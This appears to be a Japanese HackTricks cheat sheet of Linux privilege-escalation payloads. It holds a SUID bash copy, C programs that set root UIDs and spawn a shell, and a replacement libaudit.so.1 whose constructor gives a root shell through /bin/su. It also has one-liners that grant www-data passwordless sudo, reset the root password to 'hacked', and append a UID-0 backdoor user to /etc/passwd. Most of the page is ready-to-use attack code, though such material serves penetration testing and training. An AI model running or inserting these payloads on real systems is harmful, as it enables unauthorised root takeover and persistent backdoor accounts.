# 実行するPayloads

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` は privileged mode を有効にします。Bash が異なる real ID と effective ID で起動された場合、effective ID を real ID にリセットしません。結果として得られる shell は、呼び出し元が持つ既存の credentials に依存します。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid`は、許可されている場合に実 UID、実効 UID、保存 UID を変更します。一方、`setuid`は実効 UID を変更し、特権ユーザーが呼び出した場合は実 UID と保存 UID も設定することがあります。`execve`は、現在のプロセスイメージを指定されたプログラムに置き換えます。<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> これらの例では戻り値のチェックを省略しています。どちらの credential call も、UID 0 であっても失敗する可能性があります。<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## ファイルを上書きして権限を昇格する

### 一般的なファイル

以下は、一般的なローカル権限制御ファイルおよびインターフェースです。`/etc/passwd` には7フィールドのアカウントレコードが保存され、`/etc/shadow` にはオプションの暗号化されたパスワードデータが保存されます。`sudoers` は sudo の権限と `NOPASSWD` などのタグを定義します。また、Docker のデフォルトの daemon endpoint は `/var/run/docker.sock` にある Unix socket であり、この socket へのアクセスによってホストを root-level で制御できる場合があります。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- パスワード付きのユーザーを _/etc/passwd_ に追加する
- _/etc/shadow_ 内のパスワードを変更する
- _/etc/sudoers_ の sudoers にユーザーを追加する
- docker socket（通常は _/run/docker.sock_ または _/var/run/docker.sock_）を介して Docker を abuse する

### ライブラリを上書きする

バイナリが使用する shared library を確認します。この例では、`ldd` を使用して `/bin/su` を調査します。<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd`はshared-objectの依存関係を報告します。一方、dynamic linkerはELF metadataとそのsearch rulesを使用して、実行時にそれらをloadします。<sup>[[9]](#references)[[10]](#references)</sup>

候補を1つ調査するには、`objdump -T`を使用して`su`のdynamic symbol tableを出力し、audit namesでfilterします。<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`、`audit_log_user_message`、`audit_log_acct_message` は libaudit の関数です。この出力では、`audit_fd` は `su` の `.bss` に定義されたデータオブジェクトとして示されています。<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> 置換ライブラリは、loader が解決する未定義シンボルに対して互換性のある定義を export する必要があります。関数やデータの ABI が一致しない場合、それらのシンボルが relocate されたり呼び出されたりした際に、プロセスが失敗する可能性があります。<sup>[[10]](#references)[[11]](#references)</sup>

GCC の `constructor` attribute により、サポートされているターゲットでは `main` の前に `inject` が自動的に呼び出されます。<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
特権 **`/bin/su`** process に replacement が正常にロードされると、この constructor はその process の権限で **`/bin/bash`** を起動できます。正確な結果は環境に依存します。<sup>[[10]](#references)[[15]](#references)</sup>

## Scripts

root に何かを実行させられますか？

`sudoers` は policy entry で `NOPASSWD` tag を使用し、`chpasswd` は標準入力から `user:password` ペアを読み取り、`/etc/passwd` はコロンで区切られた7つの account field を使用します。以下の例では、対象となる file がそれを実行する process によって writable であることを前提としています。<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data から sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **rootパスワードの変更**
```bash
echo "root:hacked" | chpasswd
```
### `/etc/passwd` に新しい root user を追加

最終的な payload は、生成された `crypt` hash を受け入れる target に依存します。Debian の `mkpasswd -m sha-512` は SHA-512 crypt（`$6$`）にマッピングされる一方、OpenSSL の `passwd -1 -salt` は MD5 ベースの BSD algorithm（`$1$`）を使用します。<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [The Set Builtin（Bash Reference Manual）](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — Linux マニュアルページ](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — Linux マニュアルページ](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — Linux マニュアルページ](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — Linux マニュアルページ](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Debian Manpages](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Docker daemon socket の保護](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Docker Docs](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — Linux マニュアルページ](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump（GNU Binary Utilities）](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Debian Manpages](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Common Attributes（Using the GNU Compiler Collection）](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — Linux マニュアルページ](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Debian Sources](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — OpenSSL Documentation](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
